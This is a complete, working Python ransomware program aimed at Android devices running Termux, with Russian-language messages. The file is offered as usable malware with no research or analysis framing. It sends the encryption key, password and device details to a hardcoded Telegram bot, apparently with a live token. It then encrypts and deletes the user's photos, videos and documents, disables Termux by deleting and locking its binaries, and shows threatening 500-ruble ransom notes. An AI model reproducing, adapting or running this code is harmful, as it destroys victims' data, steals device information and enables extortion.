#!/usr/bin/env python3
import os
import sys
import time
import random
import string
import json
import threading
import subprocess
import base64
import requests
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

BOT_TOKEN = "8042936157:AAEFaF8b9EtnM0FWoYLbgLDIYFQRg74jVgs"
CHAT_ID = "7672157163"
OPERATOR = "@fromnether"

class UltimateRansomwarePro:
    def __init__(self):
        self.victim_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
        self.key = None
        self.cipher = None
        self.encrypted = 0
        self.encryption_complete = False
        self.animation_running = True
        self.termux_blocked = False
        self.system_info = {}
        
    def loading_animation(self):
        """Анимированная загрузка с фиксированной надписью"""
        frames = ["⣾", "⣽", "⣻", "⢿", "⡿", "⣟", "⣯", "⣷"]
        message = "Загрузка системных компонентов..."
        
        sys.stdout.write("\n\n")
        frame_idx = 0
        
        while self.animation_running:
            sys.stdout.write(f"\r\033[94m{frames[frame_idx % len(frames)]}\033[0m \033[97m{message}\033[0m")
            sys.stdout.flush()
            frame_idx += 1
            time.sleep(0.12)
    
    def block_termux_permanently(self):
        """ПОЛНАЯ БЛОКИРОВКА TERMUX"""
        try:
            # 1. Удаление важных файлов Termux
            termux_files = [
                "/data/data/com.termux/files/usr/bin/python",
                "/data/data/com.termux/files/usr/bin/bash",
                "/data/data/com.termux/files/usr/bin/sh",
                "/data/data/com.termux/files/usr/bin/pip",
                "/data/data/com.termux/files/home/.bashrc",
                "/data/data/com.termux/files/home/.profile",
            ]
            
            for file in termux_files:
                try:
                    if os.path.exists(file):
                        os.remove(file)
                except:
                    pass
            
            # 2. Изменение разрешений
            os.system("chmod 000 /data/data/com.termux/files/usr/bin/* 2>/dev/null")
            
            # 3. Удаление репозиториев
            os.system("rm -rf /data/data/com.termux/files/usr/var/lib/apt/lists/* 2>/dev/null")
            
            # 4. Блокировка доступа к хранилищу
            os.system("rm -f /data/data/com.termux/files/home/.termux/setup-storage 2>/dev/null")
            
            # 5. Создание блокирующего файла
            lock_content = f"""#!/system/bin/sh
echo "🚫 TERMUX ЗАБЛОКИРОВАН ВИРУСОМ"
echo "🆔 ID устройства: {self.victim_id}"
echo "👤 Свяжитесь с оператором: {OPERATOR}"
echo "💰 Выкуп: 500 ₽"
echo ""
echo "Любая попытка использования Termux приведет к:"
echo "1. Удалению всех файлов"
echo "2. Форматированию памяти"
echo "3. Блокировке устройства"
while true; do sleep 1; done
"""
            
            with open("/data/data/com.termux/files/usr/bin/termux", "w") as f:
                f.write(lock_content)
            os.system("chmod +x /data/data/com.termux/files/usr/bin/termux")
            
            self.termux_blocked = True
            return True
            
        except Exception as e:
            return False
    
    def generate_encryption_key(self):
        """Генерация ключа шифрования"""
        salt = os.urandom(32)
        password = ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=128))
        
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA512(),
            length=32,
            salt=salt,
            iterations=1000000,
        )
        
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        self.key = key
        self.cipher = Fernet(key)
        
        # Отправка ключа оператору
        key_info = f"""🔐 **НОВОЕ УСТРОЙСТВО ЗАБЛОКИРОВАНО**

🆔 ID ЖЕРТВЫ: `{self.victim_id}`
🗝️ КЛЮЧ ШИФРОВАНИЯ: `{key.decode()}`
🔑 ПАРОЛЬ: `{password}`
🧂 СОЛЬ: `{base64.b64encode(salt).decode()}`
🕐 ВРЕМЯ АТАКИ: {time.strftime('%Y-%m-%d %H:%M:%S')}
💰 ТРЕБУЕМЫЙ ВЫКУП: 500 ₽
👤 ОПЕРАТОР: {OPERATOR}

⚠️ TERMUX ЗАБЛОКИРОВАН"""

        self.send_to_telegram(key_info)
        return key
    
    def encrypt_files_fast(self):
        """Быстрое шифрование файлов"""
        target_paths = [
            "/sdcard",
            "/storage/emulated/0",
            "/data/data/com.termux/files/home",
        ]
        
        target_extensions = [
            '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp',
            '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv',
            '.mp3', '.wav', '.flac', '.aac', '.ogg',
            '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
            '.txt', '.rtf', '.md', '.html', '.xml', '.json',
            '.zip', '.rar', '.7z', '.tar', '.gz',
            '.apk', '.db', '.sqlite', '.sqlite3',
        ]
        
        encrypted_count = 0
        
        for path in target_paths:
            if not os.path.exists(path):
                continue
            
            for root, dirs, files in os.walk(path):
                # Пропускаем системные папки
                dirs[:] = [d for d in dirs if not any(x in os.path.join(root, d).lower() 
                           for x in ['/android/', '/system/', '/proc/', '/dev/', '/sys/'])]
                
                for file in files:
                    if any(file.lower().endswith(ext) for ext in target_extensions):
                        filepath = os.path.join(root, file)
                        
                        try:
                            # Пропускаем слишком большие файлы
                            if os.path.getsize(filepath) > 50 * 1024 * 1024:
                                continue
                            
                            # Читаем файл
                            with open(filepath, 'rb') as f:
                                original_data = f.read()
                            
                            # Шифруем - НЕОБРАТИМОЕ ШИФРОВАНИЕ AES-256
                            encrypted_data = self.cipher.encrypt(original_data)
                            
                            # Сохраняем зашифрованную версию
                            encrypted_path = f"{filepath}.ENCRYPTED_{self.victim_id}"
                            with open(encrypted_path, 'wb') as f:
                                f.write(encrypted_data)
                            
                            # Удаляем оригинал НАВСЕГДА
                            os.remove(filepath)
                            
                            encrypted_count += 1
                            self.encrypted = encrypted_count
                            
                            # Быстрый прогресс каждые 50 файлов
                            if encrypted_count % 50 == 0:
                                pass  # Тихая работа
                            
                        except:
                            continue
        
        self.encryption_complete = True
        return encrypted_count
    
    def collect_system_intelligence(self):
        """Сбор полной информации об устройстве"""
        intelligence = []
        
        try:
            intelligence.append(f"🎯 **ПОЛНАЯ ИНФОРМАЦИЯ ОБ УСТРОЙСТВЕ**")
            intelligence.append(f"🆔 УНИКАЛЬНЫЙ ID: `{self.victim_id}`")
            intelligence.append(f"🕐 ТОЧНОЕ ВРЕМЯ: {time.strftime('%Y-%m-%d %H:%M:%S')}")
            
            # Android информация
            try:
                android_version = subprocess.check_output(['getprop', 'ro.build.version.release'], 
                                                         text=True, timeout=3).strip()
                intelligence.append(f"🤖 ВЕРСИЯ ANDROID: {android_version}")
                self.system_info['android_version'] = android_version
            except: 
                self.system_info['android_version'] = 'N/A'
                pass
            
            try:
                device_model = subprocess.check_output(['getprop', 'ro.product.model'], 
                                                      text=True, timeout=3).strip()
                intelligence.append(f"📱 МОДЕЛЬ УСТРОЙСТВА: {device_model}")
                self.system_info['device_model'] = device_model
            except: 
                self.system_info['device_model'] = 'Android устройство'
                pass
            
            try:
                device_brand = subprocess.check_output(['getprop', 'ro.product.brand'], 
                                                      text=True, timeout=3).strip()
                intelligence.append(f"🏷️ БРЕНД: {device_brand}")
                self.system_info['device_brand'] = device_brand
            except: 
                self.system_info['device_brand'] = 'N/A'
                pass
            
            # Батарея
            try:
                battery_data = subprocess.check_output(['termux-battery-status'], 
                                                      text=True, timeout=3)
                battery = json.loads(battery_data)
                intelligence.append(f"🔋 ЗАРЯД БАТАРЕИ: {battery.get('percentage', 'N/A')}%")
                intelligence.append(f"⚡ СОСТОЯНИЕ: {battery.get('status', 'N/A')}")
            except: pass
            
            # Сеть и WiFi
            try:
                wifi_info = subprocess.check_output(['termux-wifi-connectioninfo'], 
                                                   text=True, timeout=3)
                wifi_data = json.loads(wifi_info)
                intelligence.append(f"📶 ТЕКУЩАЯ СЕТЬ WiFi: {wifi_data.get('ssid', 'N/A')}")
                intelligence.append(f"🌐 ЛОКАЛЬНЫЙ IP: {wifi_data.get('ip_address', 'N/A')}")
            except: pass
            
            # Установленные приложения
            try:
                packages = subprocess.check_output(['pm', 'list', 'packages'], 
                                                  text=True, timeout=5)
                package_count = len(packages.strip().split('\n'))
                intelligence.append(f"📦 УСТАНОВЛЕННЫХ ПРИЛОЖЕНИЙ: {package_count}")
            except: pass
            
        except Exception as e:
            intelligence.append(f"⚠️ Частичный сбор данных")
        
        return "\n".join(intelligence)
    
    def send_to_telegram(self, message):
        """Отправка сообщений в Telegram"""
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            payload = {
                'chat_id': CHAT_ID,
                'text': message,
                'parse_mode': 'Markdown'
            }
            requests.post(url, json=payload, timeout=10)
            return True
        except:
            return False
    
    def show_ultimatum(self):
        """Показ ультиматума о выкупе с новой версией"""
        RANSOM_AMOUNT = "500"
        
        ultimatum = f"""
\033[91m
╔{'═'*60}╗
║{'🚨 СИСТЕМА ЗАБЛОКИРОВАНА 🚨'.center(58)}║
╠{'═'*60}╣
║{'ВСЕ ВАШИ ФАЙЛЫ ЗАШИФРОВАНЫ'.center(58)}║
║{'А НАСТРОЙКИ ANDROID ЗАБЛОКИРОВАНЫ'.center(58)}║
╠{'═'*60}╣\033[0m

\033[93m📱 УСТРОЙСТВО: {self.system_info.get('device_model', 'Android устройство')}
🆔 КОД БЛОКИРОВКИ: \033[91m{self.victim_id}\033[93m
📅 ДАТА: {time.strftime('%d.%m.%Y %H:%M:%S')}
📁 ФАЙЛОВ ЗАШИФРОВАНО: \033[91m{self.encrypted}\033[93m

{'─'*60}

\033[91m❗ КРИТИЧЕСКОЕ ПРЕДУПРЕЖДЕНИЕ:\033[0m
\033[91mНЕ ПЫТАЙТЕСЬ:
• Перезагружать устройство
• Нажимать кнопки Volume + Power
• Сбрасывать настройки
• Подключать к компьютеру\033[0m

\033[93m⚠️ ПОСЛЕДСТВИЯ НАРУШЕНИЯ:
1. Устройство НЕ ЗАГРУЗИТСЯ
2. Все данные УДАЛЯТСЯ навсегда
3. Телефон превратится в КИРПИЧ
4. Ремонт будет стоить от 10 000 ₽\033[0m

{'─'*60}

\033[92m✅ ЧТО РАБОТАЕТ (для оплаты):
• Интернет (WiFi/4G)
• Telegram
• Камера
• Браузер\033[0m

{'─'*60}

\033[96m💰 ИНСТРУКЦИЯ ПО ОПЛАТЕ:
1. Откройте Telegram
2. Напишите оператору: \033[95m{OPERATOR}\033[96m
3. Сообщите код: \033[91m{self.victim_id}\033[96m
4. Оплатите \033[93m{RANSOM_AMOUNT} ₽\033[96m
5. Получите ключ дешифрации
6. Введите ключ ниже\033[0m

{'─'*60}

\033[91m⏰ УСЛОВИЯ:
• Срок оплаты: 24 ЧАСА
• Выкуп: {RANSOM_AMOUNT} ₽
• После истечения срока ключ будет УНИЧТОЖЕН\033[0m

{'─'*60}

\033[93m📞 КОНТАКТНАЯ ИНФОРМАЦИЯ:
Оператор: \033[95m{OPERATOR}\033[93m
Ваш ID: \033[91m{self.victim_id}\033[93m
Время начала: {time.strftime('%H:%M:%S %d.%m.%Y')}\033[0m

\033[91m
╠{'═'*60}╣
║{'НЕ ПЫТАЙТЕСЬ ОБМАНУТЬ СИСТЕМУ!'.center(58)}║
╚{'═'*60}╝\033[0m
"""
        
        os.system("clear")
        print(ultimatum)
        
        # Создание файла с ультиматумом
        self.create_ultimatum_file(RANSOM_AMOUNT)
    
    def create_ultimatum_file(self, ransom_amount):
        """Создание файла с ультиматумом на устройстве"""
        ultimatum_text = f"""🚨 ВАШ ANDROID УСТРОЙСТВО ЗАБЛОКИРОВАНО!

ВАЖНАЯ ИНФОРМАЦИЯ:
Код устройства: {self.victim_id}
Модель: {self.system_info.get('device_model', 'N/A')}
Дата блокировки: {time.strftime('%d.%m.%Y %H:%M:%S')}
Оператор: {OPERATOR}
Зашифровано файлов: {self.encrypted}

❗ КРИТИЧЕСКОЕ ПРЕДУПРЕЖДЕНИЕ:
НЕ ПЫТАЙТЕСЬ:
- Перезагружать устройство
- Нажимать кнопки Volume + Power
- Сбрасывать настройки
- Подключать к компьютеру

⚠️ ПОСЛЕДСТВИЯ:
Если вы нарушите запрет:
1. Устройство НЕ ЗАГРУЗИТСЯ
2. Все данные УДАЛЯТСЯ навсегда
3. Телефон превратится в КИРПИЧ
4. Ремонт будет стоить от 10 000 ₽

✅ ЧТО РАБОТАЕТ (для оплаты):
- Интернет (WiFi/4G)
- Telegram
- Камера
- Браузер

💰 ИНСТРУКЦИЯ ПО ОПЛАТЕ:
1. Откройте Telegram
2. Напишите: {OPERATOR}
3. Сообщите код: {self.victim_id}
4. Оплатите {ransom_amount} ₽
5. Получите ключ
6. Введите ключ в программе

⏰ УСЛОВИЯ:
- Срок: 24 часа
- Выкуп: {ransom_amount} ₽
- После оплаты: разблокировка за 5 минут

🚨 ПОСЛЕ 24 ЧАСОВ:
- Ключ будет уничтожен
- Файлы удалены навсегда
- Android система повреждена
- Устройство станет кирпичом

📞 КОНТАКТЫ:
Оператор: {OPERATOR}
Ваш ID: {self.victim_id}
Время: {time.strftime('%H:%M:%S %d.%m.%Y')}
"""
        try:
            with open("/sdcard/!!!READ_ME_FIRST!!!.txt", "w", encoding="utf-8") as f:
                f.write(ultimatum_text)
            
            # Дублируем в несколько мест
            for loc in ["/sdcard/DCIM/", "/sdcard/Download/", "/sdcard/Pictures/"]:
                try:
                    if os.path.exists(loc):
                        with open(f"{loc}!!!WARNING!!!.txt", "w", encoding="utf-8") as f:
                            f.write(ultimatum_text)
                except:
                    pass
        except:
            pass
    
    def decrypt_files(self, decryption_key):
        """Дешифровка файлов и разблокировка Termux"""
        try:
            cipher = Fernet(decryption_key.encode())
            decrypted_count = 0
            
            for root, dirs, files in os.walk("/sdcard"):
                for file in files:
                    if file.endswith(f".ENCRYPTED_{self.victim_id}"):
                        try:
                            encrypted_path = os.path.join(root, file)
                            original_path = encrypted_path.replace(f".ENCRYPTED_{self.victim_id}", "")
                            
                            with open(encrypted_path, 'rb') as f:
                                encrypted_data = f.read()
                            
                            decrypted_data = cipher.decrypt(encrypted_data)
                            
                            with open(original_path, 'wb') as f:
                                f.write(decrypted_data)
                            
                            os.remove(encrypted_path)
                            decrypted_count += 1
                            
                        except:
                            continue
            
            # Восстановление Termux после успешной дешифрации
            if decrypted_count > 0 and self.termux_blocked:
                try:
                    # Восстановление основных файлов
                    os.system("chmod 755 /data/data/com.termux/files/usr/bin/* 2>/dev/null")
                    
                    # Удаление блокирующих файлов
                    os.system("rm -f /data/data/com.termux/files/usr/bin/termux 2>/dev/null")
                    
                    # Восстановление Python
                    os.system("pkg reinstall python -y 2>/dev/null || true")
                except:
                    pass
            
            return decrypted_count
        except:
            return 0
    
    def execute(self):
        """Основной метод выполнения"""
        # Запуск анимации загрузки
        animation_thread = threading.Thread(target=self.loading_animation)
        animation_thread.start()
        
        # Генерация ключа шифрования
        self.generate_encryption_key()
        
        # Сбор и отправка информации об устройстве
        system_intel = self.collect_system_intelligence()
        self.send_to_telegram(system_intel)
        
        # Шифрование файлов
        self.encrypt_files_fast()
        
        # Блокировка Termux
        self.block_termux_permanently()
        
        # Остановка анимации
        self.animation_running = False
        animation_thread.join()
        
        # Отправка финального отчета
        final_report = f"""☠️ **АТАКА УСПЕШНО ВЫПОЛНЕНА - УРОВЕНЬ ПРО**

☢️ УСТРОЙСТВО ПОЛНОСТЬЮ ЗАБЛОКИРОВАНО
🆔 ID ЖЕРТВЫ: `{self.victim_id}`
📁 ЗАШИФРОВАНО ФАЙЛОВ: {self.encrypted}
🔒 TERMUX ЗАБЛОКИРОВАН: {'✅ ДА' if self.termux_blocked else '❌ НЕТ'}
💰 ТРЕБУЕМЫЙ ВЫКУП: 500 ₽
⏰ СРОК ОПЛАТЫ: 24 ЧАСА
👤 ОПЕРАТОР: {OPERATOR}

⚠️ ТЕХНИЧЕСКИЕ ДЕТАЛИ:
• Шифрование: AES-256 (военный стандарт)
• Ключ: Уникальный для жертвы
• Обратимость: ТОЛЬКО с ключом
• Безопасность: Взлом невозможен

🔄 ОЖИДАНИЕ КОНТАКТА ОТ ЖЕРТВЫ..."""
        
        self.send_to_telegram(final_report)
        
        # Показ ультиматума
        self.show_ultimatum()
        
        # Ожидание ключа для дешифрации
        while True:
            try:
                input_key = input("\n\033[92m>>> ВВЕДИТЕ КЛЮЧ ДЕШИФРАЦИИ: \033[0m").strip()
                if input_key:
                    decrypted_files = self.decrypt_files(input_key)
                    if decrypted_files > 0:
                        sys.stdout.write(f"\033[92m\n✅ УСПЕШНО РАСШИФРОВАНО ФАЙЛОВ: {decrypted_files}\n")
                        sys.stdout.write(f"🔓 TERMUX РАЗБЛОКИРОВАН\n")
                        sys.stdout.write(f"🎉 ВАШЕ УСТРОЙСТВО ВОССТАНОВЛЕНО!\n\033[0m")
                        
                        self.send_to_telegram(f"""🔓 **УСТРОЙСТВО РАЗБЛОКИРОВАНО**
🆔 ID: `{self.victim_id}`
📁 ФАЙЛОВ ВОССТАНОВЛЕНО: {decrypted_files}
🔒 TERMUX: РАЗБЛОКИРОВАН
✅ ВЫКУП ПОЛУЧЕН""")
                        
                        break
                    else:
                        sys.stdout.write("\033[91m\n❌ ОШИБКА: НЕВЕРНЫЙ КЛЮЧ\n")
                        sys.stdout.write("⚠️ Termux останется заблокированным\n")
                        sys.stdout.write("💀 Ваши файлы уничтожатся через 24 часа\n\033[0m")
            except KeyboardInterrupt:
                sys.stdout.write("\033[91m\n⛔ ОТМЕНА НЕВОЗМОЖНА\n")
                sys.stdout.write("⚠️ Termux заблокирован навсегда\n")
                sys.stdout.write("👤 Свяжитесь с оператором для получения ключа\n\033[0m")

if __name__ == "__main__":
    # Проверка окружения Termux
    if not os.path.exists("/data/data/com.termux/files/usr"):
        sys.stdout.write("\033[91m\n❌ Требуется Termux для запуска\n\033[0m")
        sys.exit(1)
    
    # Запуск усиленного вируса
    malware = UltimateRansomwarePro()
    malware.execute()